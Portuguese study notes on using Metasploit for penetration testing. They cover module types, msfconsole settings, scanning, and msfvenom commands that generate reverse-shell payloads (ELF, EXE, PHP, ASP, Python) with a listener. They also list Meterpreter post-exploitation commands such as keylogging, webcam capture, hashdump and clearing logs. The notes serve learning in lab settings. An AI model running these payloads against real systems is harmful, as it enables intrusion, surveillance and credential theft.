# Metasploit
O Projeto Metasploit é um projeto que fornece informações sobre vulnerabilidades de segurança e auxilia em testes de penetração e no desenvolvimento de assinaturas IDS.
O Metasploit inclui ferramentas antiforenses e de evasão, algumas das quais são incorporadas ao Metasploit Framework.
O Metasploit pode ser usado para testar a vulnerabilidade de sistemas de computador ou para invadir sistemas remotos. Como muitas ferramentas de segurança da informação, o Metasploit pode ser usado para atividades legítimas e não autorizadas.

Abaixo, listarei algumas informações sobre os tipos mais comuns de conceitos recorrentes:
* Exploit: Um trecho de código que utiliza uma vulnerabilidade presente no sistema alvo.
* Vulnerabilidade: Uma falha de design, codificação ou lógica que afeta o sistema alvo. A exploração de uma vulnerabilidade pode resultar na divulgação de informações confidenciais ou permitir que o invasor execute código no sistema alvo.
* Payload: Um exploit se aproveita de uma vulnerabilidade. No entanto, se quisermos que o exploit tenha o resultado desejado (obter acesso ao sistema alvo, ler informações confidenciais, etc.), precisamos usar um payload. Payloads são o código que será executado no sistema alvo.

## Principais módulos presentes no framework
### Auxiliary
Qualquer módulo de suporte, como scanners, rastreadores e fuzzers, pode ser encontrado aqui.

### Encoders

Os codificadores permitem codificar o exploit e o payload na esperança de que uma solução antivírus baseada em assinaturas não os detecte.
As soluções antivírus e de segurança baseadas em assinaturas possuem um banco de dados de ameaças conhecidas. Elas detectam ameaças comparando arquivos suspeitos com esse banco de dados e emitem um alerta se houver uma correspondência. Portanto, os codificadores podem ter uma taxa de sucesso limitada, pois as soluções antivírus podem realizar verificações adicionais.

### Evasion
Embora os codificadores codifiquem a carga útil, eles não devem ser considerados uma tentativa direta de escapar do software antivírus. Por outro lado, os módulos de "evasão" tentarão isso, com maior ou menor sucesso.

### Exploits
Exploits, organizados de forma organizada por sistema de destino.

### NOPs
NOPs (No OPeration) não fazem nada, literalmente. Eles são representados na família de CPUs Intel x86 com 0x90, após o qual a CPU não faz nada por um ciclo. Eles são frequentemente usados como um buffer para atingir tamanhos de carga úteis consistentes.

### Payload
Payloads são códigos que serão executados no sistema alvo.

Exploits aproveitarão uma vulnerabilidade no sistema alvo, mas para alcançar o resultado desejado, precisaremos de um payload.
Exemplos podem ser:
* obter um shell
* carregar um malware ou backdoor no sistema alvo
* executar um comando ou executar o calc.exe como prova de conceito para adicionar ao relatório de teste de penetração.

Iniciar a calculadora no sistema alvo remotamente, executando o aplicativo calc.exe, é uma maneira eficaz de demonstrar que podemos executar comandos no sistema alvo.

Executar comandos no sistema alvo já é uma etapa importante, mas ter uma conexão interativa que permita digitar comandos que serão executados no sistema alvo é ainda melhor. Essa linha de comando interativa é chamada de "shell". O Metasploit oferece a capacidade de enviar diferentes payloads que podem abrir shells no sistema alvo.

Há quatro diretórios diferentes em payloads: adapters, singles, stagers e stagers.

* Adaptors: Um adaptador encapsula payloads individuais para convertê-los em diferentes formatos. Por exemplo, um payload único normal pode ser encapsulado em um adaptador Powershell, que gerará um único comando do PowerShell que executará o payload.
* Singles: Payloads independentes (adicionar usuário, iniciar notepad.exe, etc.) que não precisam baixar um componente adicional para serem executados.
* Stagers: Responsáveis por configurar um canal de conexão entre o Metasploit e o sistema de destino. Útil ao trabalhar com payloads staged. "Staged payloads" primeiro carregam um stager no sistema de destino e, em seguida, baixam o restante do payload (stage). Isso oferece algumas vantagens, pois o tamanho inicial do payload será relativamente pequeno em comparação com o payload completo enviado de uma só vez.
* Stages: Baixados pelo stager. Isso permitirá que você use payloads de tamanho maior.

### Post
Os módulos post serão úteis na etapa final do processo de teste de penetração listado acima, a pós-exploração.

# Prática
### Estrutura dos prompts no Metasploit

* Prompt do sistema → (`root@ip...`) comandos normais, não do Metasploit.
* Prompt msfconsole → (`msf6 >`) ponto de partida, sem módulo em uso.
* Prompt de contexto → (`msf6 exploit(...) >`) quando você escolhe um módulo.
* Meterpreter → (`meterpreter >`) acesso interativo ao alvo após exploração.
* Shell do alvo → (`C:\Windows\system32>`) prompt direto da máquina comprometida.

---

### Configurando módulos
* Dentro de um módulo, usa-se **`show options`** para listar parâmetros obrigatórios.
* Define-se valores com **`set PARAMETRO VALOR`** (ex: `set RHOSTS 10.10.165.39`).

* Parâmetros principais:

  * RHOSTS → alvo (IP ou rede).
  * RPORT → porta do serviço vulnerável.
  * PAYLOAD → código que será executado após a exploração.
  * LHOST → IP da sua máquina atacante.
  * LPORT → porta que vai escutar a conexão reversa.
  * SESSION → ID da conexão ativa para pós-exploração.

* `unset` → limpa parâmetros (ou `unset all`).

* `setg` → define valor global, válido para todos módulos.

* `unsetg`** → remove esse valor global.

---

### Executando módulos

* `exploit` ou **`run`** → executa o módulo.
* `exploit -z` → executa e já coloca a sessão em background.
* Alguns módulos têm `check` para apenas verificar se o alvo é vulnerável sem explorar.

---

### Sessões

* Quando o exploit funciona, cria-se uma **sessão** (ex: Meterpreter).
* `background` ou `CTRL+Z` → coloca sessão em segundo plano.
* `sessions` → lista sessões ativas.
* `sessions -i <id>` → interage com uma sessão específica.

---

```
Em resumo:
O texto explica como navegar no Metasploit, configurar parâmetros de módulos (principalmente RHOSTS, RPORT, LHOST, LPORT), rodar exploits, lidar com sessões abertas e usar recursos como `setg` e `unset`.
O exemplo todo gira em torno do exploit **MS17-010 (EternalBlue)**, mostrando passo a passo desde a configuração até abrir uma sessão **Meterpreter** no alvo.
```

# Escaneamento de Portas com Metasploit

* O Metasploit tem módulos para varrer portas abertas (`search portscan`).
* Principais parâmetros:

* CONCURRENCY → quantos alvos ao mesmo tempo.
* PORTS → intervalo de portas (no Metasploit é numérico, diferente do Nmap que usa as 1000 mais comuns).
* RHOSTS → alvo/rede.
* THREADS → velocidade do scan.
 
* Dá pra rodar o **Nmap dentro do msfconsole**.
* Metasploit não substitui o Nmap em rapidez, mas é útil no processo de reconhecimento.

## Identificação de serviços UDP

* O módulo `scanner/discovery/udp_sweep` encontra rapidamente serviços em UDP (como DNS e NetBIOS).
* Não faz varredura completa, mas é bom pra achar serviços relevantes.

##Varreduras SMB e NetBIOS

**Módulos úteis:**
* `smb_enumshares` → lista compartilhamentos.
* `smb_version` → mostra versão do SMB.
 
**O **NetBIOS** também é importante, pode revelar:**

* Nome de máquina (ex.: `CORP-DC`, `DEVOPS`).
* Pastas e arquivos compartilhados, muitas vezes sem senha ou com senha fraca (`admin`, `toor` etc.).

#  O que são “low hanging fruit”?

Vulnerabilidades fáceis de identificar e explorar, que podem dar acesso inicial ao sistema (às vezes até root/administrator).

---

### Papel do Metasploit

* Depende muito da **varredura e fingerprinting** bem feitos.
* Quanto mais informações do alvo, mais módulos úteis podem ser aplicados.
* Exemplo: se identificar um serviço **VNC**, pode usar os módulos de scanner do Metasploit para procurar falhas.

---

### Exemplo prático — VNC

* Buscar módulos:

  ```
  search vnc
  use auxiliary/scanner/vnc/
  ```

* Exemplos de módulos encontrados:

  * `auxiliary/scanner/vnc/ard_root_pw`
  * `auxiliary/scanner/vnc/vnc_login`
  * `auxiliary/scanner/vnc/vnc_none_auth`

* Comando para entender cada módulo:

  ```
  info
  ```

---

### Módulo vnc\_login

* Permite testar logins em servidores VNC (versões 3.3, 3.7, 3.8 e 4.001).

* Suporta wordlists e credenciais do banco de dados.

* Principais opções:

  * `RHOSTS` → alvo(s)
  * `RPORT` → porta (padrão 5900)
  * `PASS_FILE` → wordlist de senhas
  * `STOP_ON_SUCCESS` → parar após achar credencial válida
  * `THREADS` → número de threads

* Resultado: reporta logins válidos encontrados.

# msfvenom
O `msfvenom` substituiu o `msfpayload` e `msfencode`. Ele serve pra gerar payloads em vários formatos (exe, dll, php, elf, asp, etc.) para diferentes sistemas (Windows, Linux, Android, iOS, etc.).

## Payloads:

* Podem ser **stand-alone** (ex.: um `.exe` já pronto) ou **raw** (código puro, como Python ou PHP).
* Exemplos de payloads comuns:

* `windows/meterpreter/reverse_tcp`
* `linux/x86/meterpreter/reverse_tcp`
* `php/meterpreter/reverse_tcp`
* `android/meterpreter/reverse_tcp`

* **Listar payloads disponíveis**:

  ```
  msfvenom -l payloads
  ```

* **Formatos de saída**:
  Ver os formatos suportados:

  ```
  msfvenom --list formats
  ```

* **Encoders**:

  * Só fazem **codificação do payload** (ex.: base64).
  * Não garantem bypass de antivírus.

  Exemplo (PHP + Base64):

  ```
  msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 -f raw -e php/base64
  ```

## Handlers (Catching a Shell)

* Depois de gerar o payload, você precisa de um **handler** pra receber a conexão (como um “ouvido” aberto).

* Isso é feito no **Metasploit** com:

  ```
  use exploit/multi/handler
  set payload php/reverse_php
  set LHOST <seu_IP>
  set LPORT <sua_porta>
  run
  ```

* Quando a vítima executa o payload, a conexão chega e você ganha o **shell** ou **Meterpreter**.

## Exemplos de Payloads

* **Linux (.elf)**

  ```
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
  chmod +x rev_shell.elf
  ./rev_shell.elf
  ```

* **Windows (.exe)**

  ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
  ```

* **PHP (webshell)**

  ```
  msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
  ```

* **ASP (IIS/Windows)**

  ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
  ```

* **Python**

  ```
  msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
  ```

## Pontos-Chave

* `msfvenom` gera o payload.
* O payload precisa de um **LHOST** (IP do atacante) e um **LPORT** (porta pra ouvir).
* O **multi/handler** do Metasploit recebe a conexão.
* Você pode criar payloads em praticamente qualquer linguagem/sistema.
* Todos os exemplos dados são **reverse shells** (a vítima conecta de volta em você).

# Meterpreter
O Meterpreter é um payload do Metasploit que suporta o processo de teste de penetração com muitos componentes valiosos. O Meterpreter será executado no sistema de destino e atuará como um agente dentro de uma arquitetura de comando e controle. Você interagirá com o sistema operacional e os arquivos de destino e usará os comandos especializados do Meterpreter.

O Meterpreter possui diversas versões que oferecem diferentes funcionalidades com base no sistema de destino.

## Como o Meterpreter funciona?
O Meterpreter é executado no sistema de destino, mas não é instalado nele. Ele é executado na memória e não grava a si mesmo no disco do alvo. Esse recurso visa evitar a detecção durante varreduras antivírus. Por padrão, a maioria dos softwares antivírus verifica novos arquivos no disco (por exemplo, quando você baixa um arquivo da internet). O Meterpreter é executado na memória (RAM - Memória de Acesso Aleatório) para evitar que um arquivo precise ser gravado no disco do sistema de destino (por exemplo, meterpreter.exe). Dessa forma, o Meterpreter será visto como um processo e não terá um arquivo no sistema de destino.

O Meterpreter também visa evitar a detecção por soluções de IPS (Sistema de Prevenção de Intrusão) e IDS (Sistema de Detecção de Intrusão) baseadas em rede, utilizando comunicação criptografada com o servidor onde o Metasploit é executado (normalmente a máquina do invasor). Se a organização alvo não descriptografar e inspecionar o tráfego criptografado (por exemplo, HTTPS) que entra e sai da rede local, as soluções de IPS e IDS não conseguirão detectar suas atividades.

Embora o Meterpreter seja reconhecido pela maioria dos softwares antivírus, esse recurso oferece algum grau de sigilo.

* Payloads podem ser staged (enviados em duas etapas: stager + payload) ou inline (tudo de uma vez).
* O Meterpreter também tem versões staged e inline, e existem várias versões diferentes para cada sistema.

Dá para ver todas as versões com o comando:

```msfvenom --list payloads | grep meterpreter```


Ele está disponível para várias plataformas: Android, iOS, Java, Linux, macOS, PHP, Python e Windows.

A escolha da versão depende de:
* Sistema operacional do alvo.
* Componentes disponíveis (se tem Python, PHP, etc.).
* Tipo de conexão de rede possível (TCP, HTTPS, IPv6, etc.).
* Se usar junto com um exploit, às vezes a escolha do Meterpreter é limitada pelo exploit em si.

## Comandos utilizados no Meterpreter
Cada versão do Meterpreter terá diferentes opções de comando, portanto, executar o comando ```help``` é sempre uma boa ideia. Os comandos são ferramentas integradas disponíveis no Meterpreter. Eles serão executados no sistema de destino sem carregar nenhum script ou arquivo executável adicional.

O Meterpreter fornecerá três categorias principais de ferramentas:

* Comandos integrados
* Ferramentas do Meterpreter
* Scripts do Meterpreter

Se você executar o comando help, verá que os comandos do Meterpreter estão listados em diferentes categorias.

* Comandos principais
* Comandos do sistema de arquivos
* Comandos de rede
* Comandos do sistema
* Comandos da interface do usuário
* Comandos da webcam
* Comandos de saída de áudio
* Comandos Elevate
* Comandos do banco de dados de senhas
* Comandos Timestomp

Comandos do Meterpreter

Os comandos principais serão úteis para navegar e interagir com o sistema de destino. Abaixo estão alguns dos mais usados. Lembre-se de verificar todos os comandos disponíveis executando o comando help após o início de uma sessão do Meterpreter.

```
Comandos principais

background: Coloca a sessão atual em segundo plano
exit: Encerra a sessão do Meterpreter
guid: Obtém o GUID (Identificador Global Único) da sessão
help: Exibe o menu de ajuda
info: Exibe informações sobre um módulo Post
irb: Abre um shell Ruby interativo na sessão atual
load: Carrega uma ou mais extensões do Meterpreter
migrate: Permite migrar o Meterpreter para outro processo
run: Executa um script do Meterpreter ou módulo Post
sessions: Alterna rapidamente para outra sessão

Comandos do sistema de arquivos

cd: Altera o diretório
ls: Lista os arquivos no diretório atual (dir também funciona)
pwd: Exibe o diretório de trabalho atual
edit: Permite editar um arquivo
cat: Exibe o conteúdo de um arquivo na tela
rm: Exclui o arquivo especificado
search: Busca por arquivos
upload: Envia um arquivo ou diretório
download: Baixa um arquivo ou diretório

Comandos de rede

arp: Exibe o ARP do host (Protocolo de Resolução de Endereços) cache
ifconfig: Exibe as interfaces de rede disponíveis no sistema de destino
netstat: Exibe as conexões de rede
portfwd: Encaminha uma porta local para um serviço remoto
route: Permite visualizar e modificar a tabela de roteamento

Comandos do sistema

clearev: Limpa os logs de eventos
execute: Executa um comando
getpid: Exibe o identificador do processo atual
getuid: Mostra o usuário que está executando o Meterpreter
kill: Encerra um processo
pkill: Encerra processos por nome
ps: Lista os processos em execução
reboot: Reinicia o computador remoto
shell: Entra em um shell de comando do sistema
shutdown: Desliga o computador remoto
sysinfo: Obtém informações sobre o sistema remoto, como o SO

Outros Comandos

idletime: Retorna o número de segundos em que o usuário remoto ficou ocioso
keyscan_dump: Esvazia o buffer de pressionamento de tecla
keyscan_start: Inicia a captura teclas digitadas
keyscan_stop: Interrompe a captura de teclas digitadas
screenshare: Permite que você monitore a área de trabalho do usuário remoto em tempo real
screenshot: Captura uma captura de tela da área de trabalho interativa
record_mic: Grava áudio do microfone padrão por X segundos
webcam_chat: Inicia um bate-papo por vídeo
webcam_list: Lista webcams
webcam_snap: Tira uma foto da webcam especificada
webcam_stream: Reproduz um fluxo de vídeo da webcam especificada
getsystem: Tenta elevar seu privilégio ao do sistema local
hashdump: Exibe o conteúdo do banco de dados SAM
```

## Pós-Exploração
O comando ```getuid``` exibirá o usuário com o qual o Meterpreter está sendo executado no momento. Isso lhe dará uma ideia do seu possível nível de privilégio no sistema de destino (por exemplo, você é um usuário de nível administrativo, como NT AUTHORITY\SYSTEM, ou um usuário comum?)

O comando ```ps``` listará os processos em execução. A coluna PID também fornecerá as informações de PID necessárias para migrar o Meterpreter para outro processo.

Migrar para outro processo ajudará o Meterpreter a interagir com ele. Por exemplo, se você vir um processador de texto em execução no processo de destino (por exemplo, word.exe, notepad.exe, etc.), você pode migrar para ele e começar a capturar as teclas digitadas pelo usuário para esse processo. Algumas versões do Meterpreter oferecem os comandos ```keyscan_start```, ```keyscan_stop``` e ```keyscan_dump``` para fazer o Meterpreter funcionar como um keylogger. Migrar para outro processo também pode ajudar a ter uma sessão do Meterpreter mais estável.

Para migrar para qualquer processo, você precisa digitar o comando ```migrate seguido do PID do processo de destino desejado```.

Você pode perder seus privilégios de usuário se migrar de um usuário com privilégios mais altos (por exemplo, SISTEMA) para um processo iniciado por um usuário com privilégios mais baixos (por exemplo, servidor web). Você pode não conseguir recuperá-los.

O comando ```hashdump``` listará o conteúdo do banco de dados SAM. O banco de dados SAM (Security Account Manager) armazena as senhas dos usuários em sistemas Windows. Essas senhas são armazenadas no formato NTLM (New Technology LAN Manager).

Embora não seja matematicamente possível "quebrar" esses hashes, você ainda pode descobrir a senha em texto simples usando bancos de dados NTLM online ou um ataque de rainbow table. Esses hashes também podem ser usados em ataques Pass-the-Hash para autenticar em outros sistemas que esses usuários podem acessar a mesma rede.

O comando ```search``` é útil para localizar arquivos com informações potencialmente valiosas. Em um contexto de CTF, ele pode ser usado para encontrar rapidamente um arquivo de sinalizador ou prova, enquanto em testes de penetração reais, você pode precisar procurar por arquivos gerados pelo usuário ou arquivos de configuração que podem conter senhas ou informações de conta.

```search -f flag2.txt```

O comando ```shell``` iniciará um shell de linha de comando comum no sistema de destino. Pressionar CTRL+Z ajudará você a retornar ao shell do Meterpreter.













